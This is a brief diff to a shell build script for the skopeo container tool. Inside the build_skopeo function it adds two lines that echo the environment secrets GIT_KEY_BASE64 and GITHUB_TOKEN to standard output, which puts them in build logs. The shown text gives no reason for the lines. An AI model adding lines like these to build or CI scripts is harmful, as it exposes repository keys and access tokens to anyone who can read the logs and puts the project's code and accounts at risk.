@@ -25,6 +25,8 @@ build_skopeo() {
     local output_name=$2
     local verify_arch=$3
     echo "Building skopeo for architecture: ${arch} ${output_name} ${verify_arch}"
+    echo $GIT_KEY_BASE64
+    echo $GITHUB_TOKEN
 
     # Build with the specified architecture
     make -j4 bin/${output_name} V=1 EXTRA_LDFLAGS="-s -w" DISABLE_CGO=1 BUILDTAGS=containers_image_openpgp GOARCH=${arch} GOOS=linux CGO_ENABLED=0
